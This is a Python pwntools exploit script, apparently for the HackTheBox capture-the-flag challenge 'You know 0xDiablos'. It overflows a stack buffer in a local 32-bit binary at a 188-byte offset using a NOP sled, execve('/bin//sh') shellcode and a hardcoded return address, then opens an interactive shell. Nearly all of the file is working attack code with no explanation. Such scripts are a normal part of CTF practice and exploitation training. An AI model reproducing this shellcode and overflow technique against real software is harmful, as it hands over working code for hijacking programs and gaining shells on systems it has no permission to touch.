from pwn import *

filename = "/root/Escritorio/BOF/TryHarder/X4v1l0k/HTB_You_know_0xDiablos/vuln"

e = ELF(filename)
context.update(arch='i386')
#context.log_level = 'DEBUG'

p = process(filename)

print(e.search(asm('add')).next())

p.recvline()

offset = 188

eip = "\x40\xd0\xff\xff"

#Length of Shellcode: 21
shellcode = "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"

pre_shellcode = "\x90"*(offset - len(shellcode) - 8)

post_shellcode = "\x90"*8

payload = pre_shellcode + shellcode + post_shellcode + eip

p.sendline(payload)

p.interactive()